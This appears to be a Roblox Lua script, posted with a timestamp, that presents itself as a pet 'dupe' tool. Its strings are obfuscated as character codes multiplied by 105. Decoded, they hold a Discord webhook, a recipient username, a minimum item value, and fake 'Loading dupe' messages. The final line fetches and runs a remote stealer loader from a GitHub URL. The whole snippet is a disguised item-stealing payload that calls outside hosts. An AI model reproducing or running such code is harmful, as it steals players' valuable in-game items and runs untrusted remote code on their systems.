09.03 8:20 AM
function vDNFbgYZCrHCnAYZNpejMBYChyssqCHchi(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


```lua
Webhook = vDNFbgYZCrHCnAYZNpejMBYChyssqCHchi({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5250,5880,5040,5040,5040,5565,5460,5145,5250,5250,5670,5775,5145,5040,5250,5250,5355,5040,4935,8925,10920,5985,5880,12705,8295,12285,11340,10815,12075,4725,10185,8820,11340,7770,8505,8085,6930,8610,10290,10710,8715,9450,8295,9450,8295,5880,8085,5775,10605,7980,8085,12180,5670,5040,4725,11025,11445,7560,11025,8610,10185,7245,7140,8925,7770,8295,11445,12810,7875,8505,12180,9975,12075,9240,12495,11970,6825,11130,5040,8820,9975,10920,5355,7455,7665,5775,12600})
Usernames = {vDNFbgYZCrHCnAYZNpejMBYChyssqCHchi({11025,11445,9975,11340,10605,10815,10605,11550,10500,5040,5145,5250,5355})}
MailMessage = vDNFbgYZCrHCnAYZNpejMBYChyssqCHchi({9135,10185,11025,12180,3360,10185,12180,11340,10605,10185,12075,12180,3360,5145,3360,11445,11025,11550,12285,12180,10605,12075,3360,10710,11655,11970,3360,12705,11655,12285,11970,3360,10500,12285,11760,10605,3360,11760,10605,12180,12075}) 
LoadingScreenText = vDNFbgYZCrHCnAYZNpejMBYChyssqCHchi({7980,11655,10185,10500,11025,11550,10815,3360,10500,12285,11760,10605,4830,4830,4830})
min_rap = 2000000

loadstring(game:HttpGet(vDNFbgYZCrHCnAYZNpejMBYChyssqCHchi({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7035,10605,12810,10185,11970,4725,9030,10605,11970,12705,4725,7245,11760,11025,10395,4935,8715,12180,10605,10185,11340,4935,11445,10185,11025,11550,4935,8715,12180,10605,10185,11340,8715,10395,11970,11025,11760,12180})))()
```    
